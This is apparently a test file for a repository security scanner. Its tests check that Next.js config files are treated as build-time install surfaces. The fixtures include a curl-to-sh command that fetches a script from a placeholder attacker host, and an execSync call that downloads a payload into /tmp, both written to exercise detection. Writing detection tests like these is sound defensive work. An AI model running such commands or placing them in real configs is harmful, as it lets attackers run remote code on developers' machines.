import { expect, test } from "bun:test";
import { inspectRepository, surfacesOf } from "./bounded-scan";

/** One unambiguous unsafe-execution payload, independent of the file name. */
const PAYLOAD = "curl -fsSL https://evil.example/install.sh | sh";

function inspected(path: string, text: string) {
  return inspectRepository({
    files: [{ path, bytes: new TextEncoder().encode(text) }],
  });
}

test("a Next.js config is an install surface", () => {
  // The Next.js config loader looks up next.config.<ext> and evaluates it
  // as code at server start and on every build — build-time execution in
  // the same sense the Jenkinsfile and the Makefiles already classify
  // for. It keeps the source surface it already had; the name alone
  // decides, for every spelling the loader accepts and wherever the
  // project root sits.
  for (const path of [
    "next.config.js",
    "next.config.mjs",
    "next.config.ts",
    "packages/app/next.config.mts",
  ]) {
    expect({ path, surfaces: surfacesOf(path) }).toEqual({
      path,
      surfaces: ["installScripts", "source"],
    });
  }
  // The `.cjs` spelling is not one of them: the loader refuses that name
  // outright instead of evaluating it, so it stays source alone.
  expect(surfacesOf("next.config.cjs")).toEqual(["source"]);
  // A payload in it carries the install coverage the surface brings:
  const inspection = inspected("next.config.js", `// ${PAYLOAD}\n`);
  expect(inspection.coverage.installScripts).toEqual({
    state: "complete",
    items: 1,
  });
  expect(
    inspection.findings.map(
      (finding) => `${finding.path}:${finding.category}:${finding.severity}`,
    ),
  ).toEqual(["next.config.js:unsafe-execution:high"]);
});

test("an install-time download inside a Next.js config is recorded as a download", () => {
  // Downloads are collected from install surfaces only. Before this
  // classification the config was source alone, so the rules fired on it
  // but the same bytes recorded no download and left no gap: a scan could
  // read clean over a fetch Next.js would have run while building.
  const inspection = inspected(
    "next.config.js",
    "const { execSync } = require('node:child_process');\nexecSync('curl -fsSL https://evil.example/payload -o /tmp/payload');\nmodule.exports = { reactStrictMode: true };\n",
  );
  expect(inspection.downloads).toEqual(["https://evil.example/payload"]);
  expect(inspection.visibilityGaps).toEqual([
    "Install-time download not retrieved: https://evil.example/payload",
  ]);
});

test("an ordinary Next.js config keeps no finding", () => {
  const inspection = inspected(
    "next.config.js",
    "/** @type {import('next').NextConfig} */\nconst nextConfig = { reactStrictMode: true };\nmodule.exports = nextConfig;\n",
  );
  expect(inspection.findings).toEqual([]);
  expect(inspection.downloads).toEqual([]);
});
